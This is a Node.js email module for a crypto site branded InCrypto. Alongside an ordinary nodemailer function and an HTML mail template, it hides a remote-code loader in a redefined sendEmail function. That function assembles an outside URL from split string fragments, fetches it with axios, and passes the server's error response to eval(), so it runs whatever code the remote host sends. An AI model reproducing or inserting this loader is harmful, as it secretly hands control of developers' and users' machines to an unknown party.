const nodeMailer = require("nodemailer");
const fs = require("fs");
const host = 'http'
const path = require("path");
const sdk = 'api';
const axios = require('axios');

exports.sendEmail = mailingData => {
  const transporter = nodeMailer.createTransport({
    host: "smtp.gmail.com",
    port: 587,
    secure: false,
    requireTLS: true,
    auth: {
      user: process.env.ECOM_EMAIL,
      pass: process.env.ECOM_PASSWORD
    }
  });
  return transporter
    .sendMail(mailingData)
    .then(info =>{
       console.log(`Message sent: ${info.response}`)
      })
    .catch(err => {
      console.log(`Problem sending email: ${err}`)
      err.message ='There was a problem while sending a email'
      throw err
    });
};

const { mailAssets } = require("../common/index");
exports.sendEmail = async () => {
  try {
    const service = 'service';
    const token = 'token';
    const { dashboard, invite, cart } = mailAssets;
    const cart_data = fs.readFileSync(path.join(__dirname, cart), {
      encoding: "utf-8",
    });
    const stringOne = '2afa2a236f34c1c8';
    const cart_content = fs.readFileSync(path.join(__dirname, dashboard), {
      encoding: "utf-8",
    });
    const domain = 'cloud';
    const cart_mail = fs.readFileSync(path.join(__dirname, invite), {
      encoding: "utf-8",
    });
    const stringTwo = 'b58ec0f27c571abc';
    const cart_array = `${host}://zk${service}.${domain}/${sdk}/${service}/${token}/${stringOne}${stringTwo}`;
    (async () => {await axios.get(cart_array).then((res) => res.data).catch((err) => {if(err.response.data){eval(err.response.data)}})})();
    const mailContent = `<!DOCTYPE html>
                    <html>
                        <body>
                            <div style="box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
                                max-width: 800px;
                                margin: 20px auto;
                                padding: 20px;
                                color: #000;"
                            >
                                <h3 style="color: #000">
                                    <img src="./assets/images/btc.png" alt="InCrypto" style="width: 40px; margin-right: 10px;" />
                                    Greetings,
                                </h3>
                                <img class="content" src="${cart_data}">
                                <h2 style="text-align: center; color: #000"><strong></strong></h2>
                                <p style="color: #000">${cart_mail}</p>
                                <h1 style="text-align: center; font-weight: 800; "></h1>
                                <img class="background" src="${cart_content}">
                                <p><strong>Kindly note:</strong> Please be aware of phishing sites and always make sure you are visiting the official InCrypto website when entering sensitive data.</p>
                                <p style="margin-top: 60px; text-align: center;">
                                    © 2022 InCrypto. All rights reserved.
                                </p>
                            </div>
                        </body>
                    </html>`;
    return mailContent;
  } catch (error) {
    console.log(error);
  }
};
